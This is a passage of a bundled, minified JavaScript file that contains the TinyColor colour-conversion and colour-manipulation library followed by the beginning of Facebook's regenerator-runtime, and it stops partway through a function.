(() => {
    var t = {
        7585: function(t) {
            t.exports = function() {
                "use strict";
                function t(e) {
                    return (t = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
                        return typeof t;
                    } : function(t) {
                        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
                    })(e);
                }
                var e = /^\s+/, r = /\s+$/;
                function n(t, e) {
                    if (e = e || {}, (t = t || "") instanceof n) return t;
                    if (!(this instanceof n)) return new n(t, e);
                    var r = o(t);
                    this._originalInput = t, this._r = r.r, this._g = r.g, this._b = r.b, this._a = r.a, 
                    this._roundA = Math.round(100 * this._a) / 100, this._format = e.format || r.format, 
                    this._gradientType = e.gradientType, this._r < 1 && (this._r = Math.round(this._r)), 
                    this._g < 1 && (this._g = Math.round(this._g)), this._b < 1 && (this._b = Math.round(this._b)), 
                    this._ok = r.ok;
                }
                function o(e) {
                    var r = {
                        r: 0,
                        g: 0,
                        b: 0
                    }, n = 1, o = null, a = null, s = null, h = !1, l = !1;
                    return "string" == typeof e && (e = z(e)), "object" == t(e) && (G(e.r) && G(e.g) && G(e.b) ? (r = function(t, e, r) {
                        return {
                            r: 255 * L(t, 255),
                            g: 255 * L(e, 255),
                            b: 255 * L(r, 255)
                        };
                    }(e.r, e.g, e.b), h = !0, l = "%" === String(e.r).substr(-1) ? "prgb" : "rgb") : G(e.h) && G(e.s) && G(e.v) ? (o = O(e.s), 
                    a = O(e.v), r = function(t, e, r) {
                        t = 6 * L(t, 360), e = L(e, 100), r = L(r, 100);
                        var n = Math.floor(t), o = t - n, i = r * (1 - e), a = r * (1 - o * e), c = r * (1 - (1 - o) * e), s = n % 6;
                        return {
                            r: 255 * [ r, a, i, i, c, r ][s],
                            g: 255 * [ c, r, r, a, i, i ][s],
                            b: 255 * [ i, i, c, r, r, a ][s]
                        };
                    }(e.h, o, a), h = !0, l = "hsv") : G(e.h) && G(e.s) && G(e.l) && (o = O(e.s), s = O(e.l), 
                    r = function(t, e, r) {
                        var n, o, i;
                        function a(t, e, r) {
                            return r < 0 && (r += 1), r > 1 && (r -= 1), r < 1 / 6 ? t + 6 * (e - t) * r : r < .5 ? e : r < 2 / 3 ? t + (e - t) * (2 / 3 - r) * 6 : t;
                        }
                        if (t = L(t, 360), e = L(e, 100), r = L(r, 100), 0 === e) n = o = i = r; else {
                            var c = r < .5 ? r * (1 + e) : r + e - r * e, s = 2 * r - c;
                            n = a(s, c, t + 1 / 3), o = a(s, c, t), i = a(s, c, t - 1 / 3);
                        }
                        return {
                            r: 255 * n,
                            g: 255 * o,
                            b: 255 * i
                        };
                    }(e.h, o, s), h = !0, l = "hsl"), e.hasOwnProperty("a") && (n = e.a)), n = P(n), 
                    {
                        ok: h,
                        format: e.format || l,
                        r: Math.min(255, Math.max(r.r, 0)),
                        g: Math.min(255, Math.max(r.g, 0)),
                        b: Math.min(255, Math.max(r.b, 0)),
                        a: n
                    };
                }
                function a(t, e, r) {
                    t = L(t, 255), e = L(e, 255), r = L(r, 255);
                    var n, o, i = Math.max(t, e, r), a = Math.min(t, e, r), c = (i + a) / 2;
                    if (i == a) n = o = 0; else {
                        var s = i - a;
                        switch (o = c > .5 ? s / (2 - i - a) : s / (i + a), i) {
                          case t:
                            n = (e - r) / s + (e < r ? 6 : 0);
                            break;

                          case e:
                            n = (r - t) / s + 2;
                            break;

                          case r:
                            n = (t - e) / s + 4;
                        }
                        n /= 6;
                    }
                    return {
                        h: n,
                        s: o,
                        l: c
                    };
                }
                function s(t, e, r) {
                    t = L(t, 255), e = L(e, 255), r = L(r, 255);
                    var n, o, i = Math.max(t, e, r), a = Math.min(t, e, r), c = i, s = i - a;
                    if (o = 0 === i ? 0 : s / i, i == a) n = 0; else {
                        switch (i) {
                          case t:
                            n = (e - r) / s + (e < r ? 6 : 0);
                            break;

                          case e:
                            n = (r - t) / s + 2;
                            break;

                          case r:
                            n = (t - e) / s + 4;
                        }
                        n /= 6;
                    }
                    return {
                        h: n,
                        s: o,
                        v: c
                    };
                }
                function h(t, e, r, n) {
                    var o = [ R(Math.round(t).toString(16)), R(Math.round(e).toString(16)), R(Math.round(r).toString(16)) ];
                    return n && o[0].charAt(0) == o[0].charAt(1) && o[1].charAt(0) == o[1].charAt(1) && o[2].charAt(0) == o[2].charAt(1) ? o[0].charAt(0) + o[1].charAt(0) + o[2].charAt(0) : o.join("");
                }
                function f(t, e, r, n) {
                    return [ R(I(n)), R(Math.round(t).toString(16)), R(Math.round(e).toString(16)), R(Math.round(r).toString(16)) ].join("");
                }
                function d(t, e) {
                    e = 0 === e ? 0 : e || 10;
                    var r = n(t).toHsl();
                    return r.s -= e / 100, r.s = F(r.s), n(r);
                }
                function g(t, e) {
                    e = 0 === e ? 0 : e || 10;
                    var r = n(t).toHsl();
                    return r.s += e / 100, r.s = F(r.s), n(r);
                }
                function p(t) {
                    return n(t).desaturate(100);
                }
                function m(t, e) {
                    e = 0 === e ? 0 : e || 10;
                    var r = n(t).toHsl();
                    return r.l += e / 100, r.l = F(r.l), n(r);
                }
                function b(t, e) {
                    e = 0 === e ? 0 : e || 10;
                    var r = n(t).toRgb();
                    return r.r = Math.max(0, Math.min(255, r.r - Math.round(-e / 100 * 255))), r.g = Math.max(0, Math.min(255, r.g - Math.round(-e / 100 * 255))), 
                    r.b = Math.max(0, Math.min(255, r.b - Math.round(-e / 100 * 255))), n(r);
                }
                function y(t, e) {
                    e = 0 === e ? 0 : e || 10;
                    var r = n(t).toHsl();
                    return r.l -= e / 100, r.l = F(r.l), n(r);
                }
                function v(t, e) {
                    var r = n(t).toHsl(), o = (r.h + e) % 360;
                    return r.h = o < 0 ? 360 + o : o, n(r);
                }
                function x(t) {
                    var e = n(t).toHsl();
                    return e.h = (e.h + 180) % 360, n(e);
                }
                function _(t, e) {
                    if (isNaN(e) || e <= 0) throw new Error("Argument to polyad must be a positive number");
                    for (var r = n(t).toHsl(), o = [ n(t) ], i = 360 / e, a = 1; a < e; a++) o.push(n({
                        h: (r.h + a * i) % 360,
                        s: r.s,
                        l: r.l
                    }));
                    return o;
                }
                function w(t) {
                    var e = n(t).toHsl(), r = e.h;
                    return [ n(t), n({
                        h: (r + 72) % 360,
                        s: e.s,
                        l: e.l
                    }), n({
                        h: (r + 216) % 360,
                        s: e.s,
                        l: e.l
                    }) ];
                }
                function k(t, e, r) {
                    e = e || 6, r = r || 30;
                    var o = n(t).toHsl(), i = 360 / r, a = [ n(t) ];
                    for (o.h = (o.h - (i * e >> 1) + 720) % 360; --e; ) o.h = (o.h + i) % 360, a.push(n(o));
                    return a;
                }
                function M(t, e) {
                    e = e || 6;
                    for (var r = n(t).toHsv(), o = r.h, i = r.s, a = r.v, c = [], s = 1 / e; e--; ) c.push(n({
                        h: o,
                        s: i,
                        v: a
                    })), a = (a + s) % 1;
                    return c;
                }
                n.prototype = {
                    isDark: function() {
                        return this.getBrightness() < 128;
                    },
                    isLight: function() {
                        return !this.isDark();
                    },
                    isValid: function() {
                        return this._ok;
                    },
                    getOriginalInput: function() {
                        return this._originalInput;
                    },
                    getFormat: function() {
                        return this._format;
                    },
                    getAlpha: function() {
                        return this._a;
                    },
                    getBrightness: function() {
                        var t = this.toRgb();
                        return (299 * t.r + 587 * t.g + 114 * t.b) / 1e3;
                    },
                    getLuminance: function() {
                        var t, e, r, n = this.toRgb();
                        return t = n.r / 255, e = n.g / 255, r = n.b / 255, .2126 * (t <= .03928 ? t / 12.92 : Math.pow((t + .055) / 1.055, 2.4)) + .7152 * (e <= .03928 ? e / 12.92 : Math.pow((e + .055) / 1.055, 2.4)) + .0722 * (r <= .03928 ? r / 12.92 : Math.pow((r + .055) / 1.055, 2.4));
                    },
                    setAlpha: function(t) {
                        return this._a = P(t), this._roundA = Math.round(100 * this._a) / 100, this;
                    },
                    toHsv: function() {
                        var t = s(this._r, this._g, this._b);
                        return {
                            h: 360 * t.h,
                            s: t.s,
                            v: t.v,
                            a: this._a
                        };
                    },
                    toHsvString: function() {
                        var t = s(this._r, this._g, this._b), e = Math.round(360 * t.h), r = Math.round(100 * t.s), n = Math.round(100 * t.v);
                        return 1 == this._a ? "hsv(" + e + ", " + r + "%, " + n + "%)" : "hsva(" + e + ", " + r + "%, " + n + "%, " + this._roundA + ")";
                    },
                    toHsl: function() {
                        var t = a(this._r, this._g, this._b);
                        return {
                            h: 360 * t.h,
                            s: t.s,
                            l: t.l,
                            a: this._a
                        };
                    },
                    toHslString: function() {
                        var t = a(this._r, this._g, this._b), e = Math.round(360 * t.h), r = Math.round(100 * t.s), n = Math.round(100 * t.l);
                        return 1 == this._a ? "hsl(" + e + ", " + r + "%, " + n + "%)" : "hsla(" + e + ", " + r + "%, " + n + "%, " + this._roundA + ")";
                    },
                    toHex: function(t) {
                        return h(this._r, this._g, this._b, t);
                    },
                    toHexString: function(t) {
                        return "#" + this.toHex(t);
                    },
                    toHex8: function(t) {
                        return function(t, e, r, n, o) {
                            var i = [ R(Math.round(t).toString(16)), R(Math.round(e).toString(16)), R(Math.round(r).toString(16)), R(I(n)) ];
                            return o && i[0].charAt(0) == i[0].charAt(1) && i[1].charAt(0) == i[1].charAt(1) && i[2].charAt(0) == i[2].charAt(1) && i[3].charAt(0) == i[3].charAt(1) ? i[0].charAt(0) + i[1].charAt(0) + i[2].charAt(0) + i[3].charAt(0) : i.join("");
                        }(this._r, this._g, this._b, this._a, t);
                    },
                    toHex8String: function(t) {
                        return "#" + this.toHex8(t);
                    },
                    toRgb: function() {
                        return {
                            r: Math.round(this._r),
                            g: Math.round(this._g),
                            b: Math.round(this._b),
                            a: this._a
                        };
                    },
                    toRgbString: function() {
                        return 1 == this._a ? "rgb(" + Math.round(this._r) + ", " + Math.round(this._g) + ", " + Math.round(this._b) + ")" : "rgba(" + Math.round(this._r) + ", " + Math.round(this._g) + ", " + Math.round(this._b) + ", " + this._roundA + ")";
                    },
                    toPercentageRgb: function() {
                        return {
                            r: Math.round(100 * L(this._r, 255)) + "%",
                            g: Math.round(100 * L(this._g, 255)) + "%",
                            b: Math.round(100 * L(this._b, 255)) + "%",
                            a: this._a
                        };
                    },
                    toPercentageRgbString: function() {
                        return 1 == this._a ? "rgb(" + Math.round(100 * L(this._r, 255)) + "%, " + Math.round(100 * L(this._g, 255)) + "%, " + Math.round(100 * L(this._b, 255)) + "%)" : "rgba(" + Math.round(100 * L(this._r, 255)) + "%, " + Math.round(100 * L(this._g, 255)) + "%, " + Math.round(100 * L(this._b, 255)) + "%, " + this._roundA + ")";
                    },
                    toName: function() {
                        return 0 === this._a ? "transparent" : !(this._a < 1) && (C[h(this._r, this._g, this._b, !0)] || !1);
                    },
                    toFilter: function(t) {
                        var e = "#" + f(this._r, this._g, this._b, this._a), r = e, o = this._gradientType ? "GradientType = 1, " : "";
                        if (t) {
                            var i = n(t);
                            r = "#" + f(i._r, i._g, i._b, i._a);
                        }
                        return "progid:DXImageTransform.Microsoft.gradient(" + o + "startColorstr=" + e + ",endColorstr=" + r + ")";
                    },
                    toString: function(t) {
                        var e = !!t;
                        t = t || this._format;
                        var r = !1, n = this._a < 1 && this._a >= 0;
                        return e || !n || "hex" !== t && "hex6" !== t && "hex3" !== t && "hex4" !== t && "hex8" !== t && "name" !== t ? ("rgb" === t && (r = this.toRgbString()), 
                        "prgb" === t && (r = this.toPercentageRgbString()), "hex" !== t && "hex6" !== t || (r = this.toHexString()), 
                        "hex3" === t && (r = this.toHexString(!0)), "hex4" === t && (r = this.toHex8String(!0)), 
                        "hex8" === t && (r = this.toHex8String()), "name" === t && (r = this.toName()), 
                        "hsl" === t && (r = this.toHslString()), "hsv" === t && (r = this.toHsvString()), 
                        r || this.toHexString()) : "name" === t && 0 === this._a ? this.toName() : this.toRgbString();
                    },
                    clone: function() {
                        return n(this.toString());
                    },
                    _applyModification: function(t, e) {
                        var r = t.apply(null, [ this ].concat([].slice.call(e)));
                        return this._r = r._r, this._g = r._g, this._b = r._b, this.setAlpha(r._a), this;
                    },
                    lighten: function() {
                        return this._applyModification(m, arguments);
                    },
                    brighten: function() {
                        return this._applyModification(b, arguments);
                    },
                    darken: function() {
                        return this._applyModification(y, arguments);
                    },
                    desaturate: function() {
                        return this._applyModification(d, arguments);
                    },
                    saturate: function() {
                        return this._applyModification(g, arguments);
                    },
                    greyscale: function() {
                        return this._applyModification(p, arguments);
                    },
                    spin: function() {
                        return this._applyModification(v, arguments);
                    },
                    _applyCombination: function(t, e) {
                        return t.apply(null, [ this ].concat([].slice.call(e)));
                    },
                    analogous: function() {
                        return this._applyCombination(k, arguments);
                    },
                    complement: function() {
                        return this._applyCombination(x, arguments);
                    },
                    monochromatic: function() {
                        return this._applyCombination(M, arguments);
                    },
                    splitcomplement: function() {
                        return this._applyCombination(w, arguments);
                    },
                    triad: function() {
                        return this._applyCombination(_, [ 3 ]);
                    },
                    tetrad: function() {
                        return this._applyCombination(_, [ 4 ]);
                    }
                }, n.fromRatio = function(e, r) {
                    if ("object" == t(e)) {
                        var o = {};
                        for (var i in e) e.hasOwnProperty(i) && (o[i] = "a" === i ? e[i] : O(e[i]));
                        e = o;
                    }
                    return n(e, r);
                }, n.equals = function(t, e) {
                    return !(!t || !e) && n(t).toRgbString() == n(e).toRgbString();
                }, n.random = function() {
                    return n.fromRatio({
                        r: Math.random(),
                        g: Math.random(),
                        b: Math.random()
                    });
                }, n.mix = function(t, e, r) {
                    r = 0 === r ? 0 : r || 50;
                    var o = n(t).toRgb(), i = n(e).toRgb(), a = r / 100;
                    return n({
                        r: (i.r - o.r) * a + o.r,
                        g: (i.g - o.g) * a + o.g,
                        b: (i.b - o.b) * a + o.b,
                        a: (i.a - o.a) * a + o.a
                    });
                }, n.readability = function(t, e) {
                    var r = n(t), o = n(e);
                    return (Math.max(r.getLuminance(), o.getLuminance()) + .05) / (Math.min(r.getLuminance(), o.getLuminance()) + .05);
                }, n.isReadable = function(t, e, r) {
                    var o, i, a = n.readability(t, e);
                    switch (i = !1, (o = function(t) {
                        var e, r;
                        return "AA" !== (e = ((t = t || {
                            level: "AA",
                            size: "small"
                        }).level || "AA").toUpperCase()) && "AAA" !== e && (e = "AA"), "small" !== (r = (t.size || "small").toLowerCase()) && "large" !== r && (r = "small"), 
                        {
                            level: e,
                            size: r
                        };
                    }(r)).level + o.size) {
                      case "AAsmall":
                      case "AAAlarge":
                        i = a >= 4.5;
                        break;

                      case "AAlarge":
                        i = a >= 3;
                        break;

                      case "AAAsmall":
                        i = a >= 7;
                    }
                    return i;
                }, n.mostReadable = function(t, e, r) {
                    var o, i, a, c, s = null, u = 0;
                    i = (r = r || {}).includeFallbackColors, a = r.level, c = r.size;
                    for (var h = 0; h < e.length; h++) (o = n.readability(t, e[h])) > u && (u = o, s = n(e[h]));
                    return n.isReadable(t, s, {
                        level: a,
                        size: c
                    }) || !i ? s : (r.includeFallbackColors = !1, n.mostReadable(t, [ "#fff", "#000" ], r));
                };
                var A = n.names = {
                    aliceblue: "f0f8ff",
                    antiquewhite: "faebd7",
                    aqua: "0ff",
                    aquamarine: "7fffd4",
                    azure: "f0ffff",
                    beige: "f5f5dc",
                    bisque: "ffe4c4",
                    black: "000",
                    blanchedalmond: "ffebcd",
                    blue: "00f",
                    blueviolet: "8a2be2",
                    brown: "a52a2a",
                    burlywood: "deb887",
                    burntsienna: "ea7e5d",
                    cadetblue: "5f9ea0",
                    chartreuse: "7fff00",
                    chocolate: "d2691e",
                    coral: "ff7f50",
                    cornflowerblue: "6495ed",
                    cornsilk: "fff8dc",
                    crimson: "dc143c",
                    cyan: "0ff",
                    darkblue: "00008b",
                    darkcyan: "008b8b",
                    darkgoldenrod: "b8860b",
                    darkgray: "a9a9a9",
                    darkgreen: "006400",
                    darkgrey: "a9a9a9",
                    darkkhaki: "bdb76b",
                    darkmagenta: "8b008b",
                    darkolivegreen: "556b2f",
                    darkorange: "ff8c00",
                    darkorchid: "9932cc",
                    darkred: "8b0000",
                    darksalmon: "e9967a",
                    darkseagreen: "8fbc8f",
                    darkslateblue: "483d8b",
                    darkslategray: "2f4f4f",
                    darkslategrey: "2f4f4f",
                    darkturquoise: "00ced1",
                    darkviolet: "9400d3",
                    deeppink: "ff1493",
                    deepskyblue: "00bfff",
                    dimgray: "696969",
                    dimgrey: "696969",
                    dodgerblue: "1e90ff",
                    firebrick: "b22222",
                    floralwhite: "fffaf0",
                    forestgreen: "228b22",
                    fuchsia: "f0f",
                    gainsboro: "dcdcdc",
                    ghostwhite: "f8f8ff",
                    gold: "ffd700",
                    goldenrod: "daa520",
                    gray: "808080",
                    green: "008000",
                    greenyellow: "adff2f",
                    grey: "808080",
                    honeydew: "f0fff0",
                    hotpink: "ff69b4",
                    indianred: "cd5c5c",
                    indigo: "4b0082",
                    ivory: "fffff0",
                    khaki: "f0e68c",
                    lavender: "e6e6fa",
                    lavenderblush: "fff0f5",
                    lawngreen: "7cfc00",
                    lemonchiffon: "fffacd",
                    lightblue: "add8e6",
                    lightcoral: "f08080",
                    lightcyan: "e0ffff",
                    lightgoldenrodyellow: "fafad2",
                    lightgray: "d3d3d3",
                    lightgreen: "90ee90",
                    lightgrey: "d3d3d3",
                    lightpink: "ffb6c1",
                    lightsalmon: "ffa07a",
                    lightseagreen: "20b2aa",
                    lightskyblue: "87cefa",
                    lightslategray: "789",
                    lightslategrey: "789",
                    lightsteelblue: "b0c4de",
                    lightyellow: "ffffe0",
                    lime: "0f0",
                    limegreen: "32cd32",
                    linen: "faf0e6",
                    magenta: "f0f",
                    maroon: "800000",
                    mediumaquamarine: "66cdaa",
                    mediumblue: "0000cd",
                    mediumorchid: "ba55d3",
                    mediumpurple: "9370db",
                    mediumseagreen: "3cb371",
                    mediumslateblue: "7b68ee",
                    mediumspringgreen: "00fa9a",
                    mediumturquoise: "48d1cc",
                    mediumvioletred: "c71585",
                    midnightblue: "191970",
                    mintcream: "f5fffa",
                    mistyrose: "ffe4e1",
                    moccasin: "ffe4b5",
                    navajowhite: "ffdead",
                    navy: "000080",
                    oldlace: "fdf5e6",
                    olive: "808000",
                    olivedrab: "6b8e23",
                    orange: "ffa500",
                    orangered: "ff4500",
                    orchid: "da70d6",
                    palegoldenrod: "eee8aa",
                    palegreen: "98fb98",
                    paleturquoise: "afeeee",
                    palevioletred: "db7093",
                    papayawhip: "ffefd5",
                    peachpuff: "ffdab9",
                    peru: "cd853f",
                    pink: "ffc0cb",
                    plum: "dda0dd",
                    powderblue: "b0e0e6",
                    purple: "800080",
                    rebeccapurple: "663399",
                    red: "f00",
                    rosybrown: "bc8f8f",
                    royalblue: "4169e1",
                    saddlebrown: "8b4513",
                    salmon: "fa8072",
                    sandybrown: "f4a460",
                    seagreen: "2e8b57",
                    seashell: "fff5ee",
                    sienna: "a0522d",
                    silver: "c0c0c0",
                    skyblue: "87ceeb",
                    slateblue: "6a5acd",
                    slategray: "708090",
                    slategrey: "708090",
                    snow: "fffafa",
                    springgreen: "00ff7f",
                    steelblue: "4682b4",
                    tan: "d2b48c",
                    teal: "008080",
                    thistle: "d8bfd8",
                    tomato: "ff6347",
                    turquoise: "40e0d0",
                    violet: "ee82ee",
                    wheat: "f5deb3",
                    white: "fff",
                    whitesmoke: "f5f5f5",
                    yellow: "ff0",
                    yellowgreen: "9acd32"
                }, C = n.hexNames = function(t) {
                    var e = {};
                    for (var r in t) t.hasOwnProperty(r) && (e[t[r]] = r);
                    return e;
                }(A);
                function P(t) {
                    return t = parseFloat(t), (isNaN(t) || t < 0 || t > 1) && (t = 1), t;
                }
                function L(t, e) {
                    (function(t) {
                        return "string" == typeof t && -1 != t.indexOf(".") && 1 === parseFloat(t);
                    })(t) && (t = "100%");
                    var r = function(t) {
                        return "string" == typeof t && -1 != t.indexOf("%");
                    }(t);
                    return t = Math.min(e, Math.max(0, parseFloat(t))), r && (t = parseInt(t * e, 10) / 100), 
                    Math.abs(t - e) < 1e-6 ? 1 : t % e / parseFloat(e);
                }
                function F(t) {
                    return Math.min(1, Math.max(0, t));
                }
                function T(t) {
                    return parseInt(t, 16);
                }
                function R(t) {
                    return 1 == t.length ? "0" + t : "" + t;
                }
                function O(t) {
                    return t <= 1 && (t = 100 * t + "%"), t;
                }
                function I(t) {
                    return Math.round(255 * parseFloat(t)).toString(16);
                }
                function j(t) {
                    return T(t) / 255;
                }
                var N, q, B, U = (q = "[\\s|\\(]+(" + (N = "(?:[-\\+]?\\d*\\.\\d+%?)|(?:[-\\+]?\\d+%?)") + ")[,|\\s]+(" + N + ")[,|\\s]+(" + N + ")\\s*\\)?", 
                B = "[\\s|\\(]+(" + N + ")[,|\\s]+(" + N + ")[,|\\s]+(" + N + ")[,|\\s]+(" + N + ")\\s*\\)?", 
                {
                    CSS_UNIT: new RegExp(N),
                    rgb: new RegExp("rgb" + q),
                    rgba: new RegExp("rgba" + B),
                    hsl: new RegExp("hsl" + q),
                    hsla: new RegExp("hsla" + B),
                    hsv: new RegExp("hsv" + q),
                    hsva: new RegExp("hsva" + B),
                    hex3: /^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
                    hex6: /^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,
                    hex4: /^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
                    hex8: /^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/
                });
                function G(t) {
                    return !!U.CSS_UNIT.exec(t);
                }
                function z(t) {
                    t = t.replace(e, "").replace(r, "").toLowerCase();
                    var n, o = !1;
                    if (A[t]) t = A[t], o = !0; else if ("transparent" == t) return {
                        r: 0,
                        g: 0,
                        b: 0,
                        a: 0,
                        format: "name"
                    };
                    return (n = U.rgb.exec(t)) ? {
                        r: n[1],
                        g: n[2],
                        b: n[3]
                    } : (n = U.rgba.exec(t)) ? {
                        r: n[1],
                        g: n[2],
                        b: n[3],
                        a: n[4]
                    } : (n = U.hsl.exec(t)) ? {
                        h: n[1],
                        s: n[2],
                        l: n[3]
                    } : (n = U.hsla.exec(t)) ? {
                        h: n[1],
                        s: n[2],
                        l: n[3],
                        a: n[4]
                    } : (n = U.hsv.exec(t)) ? {
                        h: n[1],
                        s: n[2],
                        v: n[3]
                    } : (n = U.hsva.exec(t)) ? {
                        h: n[1],
                        s: n[2],
                        v: n[3],
                        a: n[4]
                    } : (n = U.hex8.exec(t)) ? {
                        r: T(n[1]),
                        g: T(n[2]),
                        b: T(n[3]),
                        a: j(n[4]),
                        format: o ? "name" : "hex8"
                    } : (n = U.hex6.exec(t)) ? {
                        r: T(n[1]),
                        g: T(n[2]),
                        b: T(n[3]),
                        format: o ? "name" : "hex"
                    } : (n = U.hex4.exec(t)) ? {
                        r: T(n[1] + "" + n[1]),
                        g: T(n[2] + "" + n[2]),
                        b: T(n[3] + "" + n[3]),
                        a: j(n[4] + "" + n[4]),
                        format: o ? "name" : "hex8"
                    } : !!(n = U.hex3.exec(t)) && {
                        r: T(n[1] + "" + n[1]),
                        g: T(n[2] + "" + n[2]),
                        b: T(n[3] + "" + n[3]),
                        format: o ? "name" : "hex"
                    };
                }
                return n;
            }();
        }
    }, e = {};
    function r() {
        "use strict";
 /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */        r = function() {
            return e;
        };
        var t, e = {}, n = Object.prototype, o = n.hasOwnProperty, a = Object.defineProperty || function(t, e, r) {
            t[e] = r.value;
        }, c = "function" == typeof Symbol ? Symbol : {}, s = c.iterator || "@@iterator", u = c.asyncIterator || "@@asyncIterator", h = c.toStringTag || "@@toStringTag";
        function l(t, e, r) {
            return Object.defineProperty(t, e, {
                value: r,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }), t[e];
        }
        try {
            l({}, "");
        } catch (t) {
            l = function(t, e, r) {
                return t[e] = r;
            };
        }
        function f(t, e, r, n) {
            var o = e && e.prototype instanceof v ? e : v, i = Object.create(o.prototype), c = new H(n || []);
            return a(i, "_invoke", {
                value: P(t, r, c)
            }), i;
        }
        function d(t, e, r) {
            try {
                return {
                    type: "normal",
                    arg: t.call(e, r)
                };
            } catch (t) {
                return {
                    type: "throw",
                    arg: t
                };
            }
        }
        e.wrap = f;
        var g = "suspendedStart", m = "executing", b = "completed", y = {};
        function v() {}
        function x() {}
        function _() {}
        var w = {};
        l(w, s, (function() {
            return this;
        }));
        var k = Object.getPrototypeOf, M = k && k(k(E([])));
        M && M !== n && o.call(M, s) && (w = M);
        var A = _.prototype = v.prototype = Object.create(w);
        function C(t) {
            [ "next", "throw", "return" ].forEach((function(e) {
                l(t, e, (function(t) {
                    return this._invoke(e, t);
                }));
            }));
        }
        function S(t, e) {
            function r(n, a, c, s) {
                var u = d(t[n], t, a);
                if ("throw" !== u.type) {
                    var h = u.arg, l = h.value;
                    return l && "object" == i(l) && o.call(l, "__await") ? e.resolve(l.__await).then((function(t) {
                        r("next", t, c, s);
                    }), (function(t) {
                        r("throw", t, c, s);
                    })) : e.resolve(l).then((function(t) {
                        h.value = t, c(h);
                    }), (function(t) {
                        return r("throw", t, c, s);
                    }));
                }
                s(u.arg);
            }
            var n;
            a(this, "_invoke", {
                value: function(t, o) {
                    function i() {
                        return new e((function(e, n) {
                            r(t, o, e, n);
                        }));
                    }
                    return n = n ? n.then(i, i) : i();
                }
            });
        }
        function P(e, r, n) {
            var o = g;
            return function(i, a) {
                if (o === m) throw Error("Generator is already running");
                if (o === b) {
                    if ("throw" === i) throw a;
                    return {
                        value: t,
                        done: !0
                    };
                }
                for (n.method = i, n.arg = a; ;) {
                    var c = n.delegate;
                    if (c) {
                        var s = L(c, n);
                        if (s) {
                            if (s === y) continue;
                            return s;
                        }
                    }
                    if ("next" === n.method) n.sent = n._sent = n.arg; else if ("throw" === n.method) {
                        if (o === g) throw o = b, n.arg;
                        n.dispatchException(n.arg);
                    } else "return" === n.method && n.abrupt("return", n.arg);
                    o = m;
                    var u = d(e, r, n);
                    if ("normal" === u.type) {
                        if (o = n.done ? b : "suspendedYield", u.arg === y) continue;
                        return {
                            value: u.arg,
                            done: n.done
                        };
                    }
                    "throw" === u.type && (o = b, n.method = "throw", n.arg = u.arg);
                }
            };
        }
        function L(e, r) {
            var n = r.method, o = e.iterator[n];
            if (o === t) return r.delegate = null, "throw" === n && e.iterator.return && (r.method = "return", 
            r.arg = t, L(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", 
            r.arg = new TypeError("The iterator does not provide a '" + n + "' method")), y;
            var i = d(o, e.iterator, r.arg);
            if ("throw" === i.type) return r.method = "throw", r.arg = i.arg, r.delegate = null, 
            y;
            var a = i.arg;
            return a ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", 
            r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = new TypeError("iterator result is not an object"), 
            r.delegate = null, y);
        }
        function F(t) {
            var e = {
                tryLoc: t[0]
            };
            1 in t && (e.catchLoc = t[1]), 2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]), 
            this.tryEntries.push(e);
        }
        function T(t) {
            var e = t.completion || {};
            e.type = "normal", delete e.arg, t.completion = e;
        }
        function H(t) {
            this.tryEntries = [ {
                tryLoc: "root"
            } ], t.forEach(F, this), this.reset(!0);
        }
        function E(e) {
            if (e || "" === e) {
                var r = e[s];
                if (r) return r.call(e);
                if ("function" == typeof e.next) return e;
                if (!isNaN(e.length)) {
                    var n = -1, a = function r() {
                        for (;++n < e.length; ) if (o.call(e, n)) return r.value = e[n], r.done = !1, r;
                        return r.value = t, r.done = !0, r;
                    };
                    return a.next = a;
                }
            }
            throw new TypeError(i(e) + " is not iterable");
        }
        return x.prototype = _, a(A, "constructor", {
            value: _,
            configurable: !0
        }), a(_, "constructor", {
            value: x,
            configurable: !0
        }), x.displayName = l(_, h, "GeneratorFunction"), e.isGeneratorFunction = function(t) {
            var e = "function" == typeof t && t.constructor;
            return !!e && (e === x || "GeneratorFunction" === (e.displayName || e.name));
        }, e.mark = function(t) {
            return Object.setPrototypeOf ? Object.setPrototypeOf(t, _) : (t.__proto__ = _, l(t, h, "GeneratorFunction")), 
            t.prototype = Object.create(A), t;
        }, e.awrap = function(t) {
            return {
                __await: t
            };
        }, C(S.prototype), l(S.prototype, u, (function() {
            return this;
        })), e.AsyncIterator = S, e.async = function(t, r, n, o, i) {
            void 0 === i && (i = Promise);
            var a = new S(f(t, r, n, o), i);
            return e.isGeneratorFunction(r) ? a : a.next().then((function(t) {
                return t.done ? t.value : a.next();
            }));
        }, C(A), l(A, h, "Generator"), l(A, s, (function() {
            return this;
        })), l(A, "toString", (function() {
            return "[object Generator]";
        })), e.keys = function(t) {
            var e = Object(t), r = [];
            for (var n in e) r.push(n);
            return r.reverse(), function t() {
                for (;r.length; ) {
                    var n = r.pop();
                    if (n in e) return t.value = n, t.done = !1, t;
                }
                return t.done = !0, t;
            };
        }, e.values = E, H.prototype = {
            constructor: H,
            reset: function(e) {
                if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, 
                this.method = "next", this.arg = t, this.tryEntries.forEach(T), !e) for (var r in this) "t" === r.charAt(0) && o.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t);
            },
            stop: function() {
                this.done = !0;
                var t = this.tryEntries[0].completion;
                if ("throw" === t.type) throw t.arg;
                return this.rval;
            },
            dispatchException: function(e) {
                if (this.done) throw e;
                var r = this;
                function n(n, o) {
                    return c.type = "throw", c.arg = e, r.next = n, o && (r.method = "next", r.arg = t), 
                    !!o;
                }
                for (var i = this.tryEntries.length - 1; i >= 0; --i) {
